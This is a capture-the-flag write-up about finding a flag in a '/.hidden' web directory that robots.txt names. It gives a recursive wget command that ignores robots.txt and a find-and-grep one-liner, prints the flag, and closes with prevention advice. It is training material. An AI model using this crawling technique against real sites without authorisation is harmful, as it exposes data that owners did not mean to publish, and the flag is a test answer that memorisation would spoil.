# Description

Visting the robots.txt route give us the follwing output

```html
User-agent: *
Disallow: /whatever
Disallow: /.hidden
```

If we visit the /.hidden route we will get a recursive directories containing a file named README

The thing here is to loop through all directories and print all **README** files till we get the flag.

# Attack 

To do that we need to download the whole directory offline using **wget**

```bash
[~/goinfre/dd]$ wget -r -npH --cut-dirs=1 -R "index.html*" -e "robots=off" "http://10.14.59.83/.hidden/"
[~/goinfre/dd]$ ls
amcbevgondgcrloowluziypjdh  jfiombdhvlwxrkmawgoruhbarp  rlnoyduccpqxkvcfiqpdikfpvx
bnqupesbgvhbcwqhcuynjolwkm  kpibbgxjqnvrrcpczovjbvijmz  sdnfntbyirzllbpctnnoruyjjc
ceicqljdddshxvnvdqzzjgddht  ldtafmsxvvydthtgflzhadiozs  trwjgrgmfnzarxiiwvwalyvanm
doxelitrqvhegnhlhrkdgfizgj  mrucagbgcenowkjrlmmugvztuh  urhkbrmupxbgdnntopklxskvom
eipmnwhetmpbhiuesykfhxmyhr  ntyrhxjbtndcpjevzurlekwsxt  viphietzoechsxwqacvpsodhaq
ffpbexkomzbigheuwhbhbfzzrg  oasstobmotwnezhscjjopenjxy  whtccjokayshttvxycsvykxcfm
ghouhyooppsmaizbmjhtncsvfz  ppjxigqiakcrmqfhotnncfqnqg  xuwrcwjjrmndczfcrmwmhvkjnh
hwlayeghtcotqdigxuigvjufqn  qcwtnvtdfslnkvqvzhjsmsghfw  yjxemfsgdlkbvvtjiylhdoaqkn
isufpcgmngmrotmrjfjonpmkxu  README                      zzfzjvjsupgzinctxeqtzzdzll
```



Now we will use find command to find all README files and print it's content, it my take a while

```bash
[~/goinfre/dd]$ find . -type f -name "README" -exec cat {} \;|grep flag                                 
Hey, here is your flag : d5eec3ec36cf80dce44a896f961c1831a05526ec215693c8f2c39543497d4466
[~/goinfre/dd]$ 
```

# Prevention

- **robots.txt:** While robots.txt is used to communicate with web crawlers, it's not a secure method for hiding sensitive content. Avoid placing sensitive information in locations mentioned in robots.txt.

- **Directory Listing:** Disable directory listing on your web server to prevent the automatic display of directory contents. This can be configured in the server's settings.

- **Access Control:** Implement proper access controls to restrict access to sensitive directories and files. Use authentication and authorization mechanisms to ensure that only authorized users can access them.

- **Sensitive Information:** Avoid placing sensitive information in locations accessible from the web. Sensitive data should be stored securely, away from the webroot.
